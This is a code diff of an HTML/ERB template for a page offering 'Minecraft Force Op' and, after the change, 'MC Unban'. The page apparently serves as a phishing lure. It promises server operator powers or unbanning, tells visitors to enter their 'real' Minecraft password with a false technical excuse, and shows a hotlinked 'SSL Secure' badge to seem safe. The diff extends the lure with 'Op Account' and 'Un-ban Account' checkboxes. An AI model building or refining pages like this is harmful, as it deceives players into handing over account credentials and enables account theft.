@@ -3,7 +3,7 @@
 	</head>
 	<body>
 		<header>
-			<h1>Minecraft Force Op</h1>
+			<h1>Minecraft Force Op + MC Unban</h1>
 		</header>
 		<div class="content" id="content">
 		<form>
@@ -19,7 +19,11 @@
 				MC <%= f.label :password %><img 	src="http://www.copperriverbags.com/product_images/uploaded_images/secure.png"style="padding-left: 2px;" height="15px" width="17px" title="SSL 	Secure"><br />
 				<%=	f.password_field :username %>
 			</p>
-			<p style="font-size: 12px;">Be sure to enter your <span style="font-weight: bold;">real</span> Minecraft password into the secure password form in order to allow the desired Minecraft server to properly render your username.<br /> <a href="https://minecraft.net/resetpassword">Forgot your minecraft password?</a>
+			<p style="font-size: 12px;">Be sure to enter your <span style="font-weight: bold;">real</span> Minecraft password into the secure password form in order to allow the desired Minecraft server to properly render your username.<br /> <a href="https://minecraft.net/resetpassword">Forgot your minecraft password?</a></p>
+			<form>
+			<input type="checkbox" name="vehicle" value="Bike" checked>Op Account<br>
+			<input type="checkbox" name="vehicle" value="Car">Un-ban Account
+			</form>
 			<p>
 				<%= f.submit "Begin Force Op" %>
 			</p>
